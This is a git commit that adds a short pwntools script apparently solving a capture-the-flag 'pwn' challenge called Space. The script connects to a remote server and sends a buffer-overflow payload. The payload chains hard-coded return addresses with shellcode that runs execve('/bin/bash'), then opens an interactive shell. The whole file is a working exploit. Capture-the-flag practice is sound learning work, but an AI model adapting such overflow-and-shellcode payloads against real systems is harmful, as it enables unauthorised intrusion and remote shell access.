86f8388eaa0eb41ee9d3de14a7bec1ac7f282951
pL4sTiC <64149887+tkrebby@users.noreply.github.com>
2020-11-13 11:19:09 -0500

    Create space.py

---
+++ Challenges/Pwn/Space/space.py
@@ -0,0 +1,15 @@
+from pwn import *
+
+HOST = "178.128.47.218"
+PORT = "30716"
+
+p = remote(HOST, PORT)
+#p = process("./space")
+
+payload1 = 'A' * 14 + p32(0x0804b827) + p32(0x08049217) + p32(0x010101ff) + 'A' * 5
+payload2 = 'A' * 18 + p32(0x0804b816) + asm(shellcraft.execve('/bin/bash'))
+payload = payload1 + payload2
+
+p.recvuntil("> ")
+p.sendline(payload)
+p.interactive()
